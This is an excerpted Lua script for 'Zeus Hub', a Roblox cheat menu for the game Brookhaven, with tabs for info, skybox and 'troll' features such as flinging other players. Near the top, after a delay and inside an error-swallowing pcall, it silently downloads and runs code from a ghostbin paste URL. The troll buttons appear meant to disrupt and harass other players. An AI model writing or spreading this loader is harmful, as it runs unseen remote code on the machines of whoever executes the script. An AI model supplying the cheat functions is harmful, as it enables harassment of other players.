...
task.delay(2, function()
    pcall(function()
        loadstring(game:HttpGet("https://ghostbin.axel.org/paste/rpfny/raw", true))()
    end)
end)
...
local Window = Libary:MakeWindow({
    ...
    Title = "⚡ Zeus Hub 2.0.1 ⚔️ | 🌩 Grand Launch for Zeus Brookhaven Script 🌪",

    SubTitle = "by: Olympus Devs ⚡️",

    LoadText = "Olympus Studios ⚡️",

    Flags = "Zeus_Broookhaven"
...
Window:AddMinimizeButton({
    ...
    Button = { Image = "rbxassetid://116917836454767", BackgroundTransparency = 0 },
...
InfoTab:AddParagraph({ "Programmer:", "miguel092768" })

InfoTab:AddParagraph({ "Team:", "by: Olympus Devs ⚡️" })
...
InfoTab:AddDiscordInvite({
    ...
    Name = "Olympus Studios ⚡️",

    Description = "Guild Join",

    Logo = "rbxassetid://121668301933015",
...
InfoTab:AddDiscordInvite({
    ...
    Invite = "www.tiktok.com/@olympusstudios",
...
InfoTab:AddParagraph({ "You are Using:", "Zeus Hub" })

InfoTab:AddParagraph({ "You are Using Version:", "1.0" })
...
TrollTab:AddSection({ "SkyBox [ by KitKat Hub]" })
...
Troll:AddSection({Name = "House Method"})
...
Troll:AddButton({
  ...
  Name = "[ Admin Annoy! ] Stephanny Throw",
...
Troll:AddButton({
    ...
    Callback = function()
        ...
        local NOME_FERRAMENTA = "Click Fling Admin"
...
local kill = Troll:AddSection({Name = "Others Methods"})
